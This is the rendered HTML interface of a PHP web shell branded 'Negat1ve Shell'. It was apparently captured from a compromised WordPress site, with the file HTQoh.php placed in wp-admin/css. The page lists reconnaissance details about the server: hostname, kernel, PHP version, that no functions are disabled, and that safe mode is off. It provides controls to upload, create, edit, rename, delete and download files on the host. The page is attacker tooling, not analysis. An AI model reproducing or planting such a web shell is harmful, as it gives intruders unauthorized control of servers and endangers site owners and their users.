<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
	<title>Negat1ve Shell</title>
</head>
<body>
	<div class="container-lg">
		
		<nav class="navbar navbar-light bg-light">
			<div class="container-fluid">
				<a class="navbar-brand" href="?">
					<img src="https://static.wikia.nocookie.net/central/images/1/12/Pacman2.jpg" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
					Negat1ve Shell				</a>
			</div>
		</nav>
		
		
		<div id="tool">
			<div class="d-flex justify-content-center flex-wrap my-3">
				<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
			</div>
			
			<div class="row">
				<div class="col-md-12">
					<div class="collapse" id="upload" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								 <div class="col-md-6">
									<form action="" method="post" enctype="multipart/form-data">
										<div class="input-group">
											<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
											<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
										</div>
									</form>
								 </div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfile" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">File Name</label>
											<input type="text" class="form-control" name="filename" placeholder="negat1ve.txt">
										</div>
										<div class="mb-3">
											<label class="form-label">File Content</label>
											<textarea class="form-control" rows="5" name="filecontent"></textarea>
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfolder" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">Folder Name</label>
											<input type="text" class="form-control" name="foldername" placeholder="negat1ve">
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-md-12">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fas fa-angry"></i> Server Information </h5>
						<div class="table-responsive">
							<table class="table table-hover text-nowrap">
								<tr>
									<td>Operating System</td>
									<td> : Linux germanymachine.hh-webserver.com 3.10.0-1160.76.1.el7.x86_64 #1 SMP Wed Aug 10 16:21:17 UTC 2022 x86_64</td>
								</tr>
								<tr>
									<td>PHP Version</td>
									<td> : 7.4.33</td>
								</tr>

								<tr>
									<td>Storage</td>
									<td class="d-flex">: Total = 390.68 GB, Free = 195.17 GB [49%]</td>
								</tr>

								<tr>
									<td>Disable Functions</td>
									<td>: <font class='text-success'>All function is accessible</font></td>
								</tr>

								<tr>
									<td colspan="2">CURL : <font class="text-success">ON</font> | SSH2 : <font class="text-danger">OFF</font> | Magic Quotes : <font class="text-success">ON</font> | MySQL : <font class="text-success">ON</font> | MSSQL : <font class="text-danger">OFF</font> | PostgreSQL : <font class="text-danger">OFF</font> | Oracle : <font class="text-danger">OFF</font></td>
								</tr>
								<tr>
									<td colspan="2">Safe Mode : <font class="text-danger">OFF</font> | Open Basedir : <font class="text-warning">NONE</font> | Safe Mode Exec Dir : <font class="text-warning">NONE</font> | Safe Mode Include Dir : <font class="text-warning">NONE</font></td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fas fa-angry"></i> Path </h5>
						<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
							<ol class="breadcrumb">
								<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li><li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/home">home</a></li><li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/home/campusja">campusja</a></li><li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/home/campusja/public_html">public_html</a></li><li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/home/campusja/public_html/wp-admin">wp-admin</a></li><li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/home/campusja/public_html/wp-admin/css">css</a></li><li class="breadcrumb-item active" aria-current="page">HTQoh.php</li>							</ol>
						</nav>
						[ <font class='text-success'>0644 </font> >> <font class='text-success'> -rw-r--r--</font> ]
					</div>
				</div>
			</div>
			<div class="col-md-12" id="main">
				<div class="card border-dark overflow-auto">
					<div class="card-body">
						<h5><i class="fa fa-"></i> </h5>
																					<div class="table-responsive">
									<table class="table table-hover text-nowrap">
										<thead>
											<tr>
												<th>Name</th>
												<th>Type</th>
												<th>Size</th>
												<th>Last Modified</th>
												<th>Owner/Group</th>
												<th>Permission</th>
												<th>Action</th>
											</tr>
										</thead>
										<tbody>
																																</tbody>
									</table>
								</div>
																		</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						Copyright negat1ve1337@gmail.com <span class="float-end">Coded by <span class="text-muted">Negat1ve</span></span>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form method="post" id="rename-form">
		      <div class="modal-body">
		          <div class="mb-3">
		            <label for="newname" class="col-form-label">New Name:</label>
		            <input type="text" class="form-control" name="newname" id="newname">
		          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Rename</button>
		      </div>
        </form>
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to delete this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to download this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="download-confirm">Download</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form action="" method="post">
		      <div class="modal-body">
		        <div class="mb-3">
	            <label for="content" class="col-form-label">Content:</label>
	            <textarea class="form-control" id="content" rows="15" name="content"></textarea>
	          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Save</button>
		      </div>
	      </form>
	    </div>
	  </div>
	</div>
	
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
	<script>
		var renameModal = document.getElementById('renameModal')
		var deleteModal = document.getElementById('deleteModal')
		var viewModal = document.getElementById('viewModal')
		var downloadModal = document.getElementById('downloadModal')
		
		renameModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var name = button.getAttribute('data-bs-name')
			var modalTitle = renameModal.querySelector('.modal-title')
			var modalBodyInput = renameModal.querySelector('.modal-body input')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "oldname";
			document.getElementById("rename-form").appendChild(hiddenInput);
			
			modalBodyInput.value = name
		})
		
		deleteModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var deleteConfirm = document.getElementById('delete-confirm')
			deleteConfirm.href = '?dir=' + file + '&do=delete'
		})
		
		downloadModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var downloadConfirm = document.getElementById('download-confirm')
			downloadConfirm.href = '?dir=' + file + '&do=download'
		})
		
		viewModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var content = button.getAttribute('data-bs-content')
			var name = button.getAttribute('data-bs-name')
			var modalTitle = viewModal.querySelector('.modal-title')
			var modalContent = viewModal.querySelector('.modal-body textarea')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "filename";
			viewModal.querySelector("form").appendChild(hiddenInput);

			modalTitle.textContent = 'Edit ' + name
			modalContent.value = content
		})
	</script>
</body>
</html>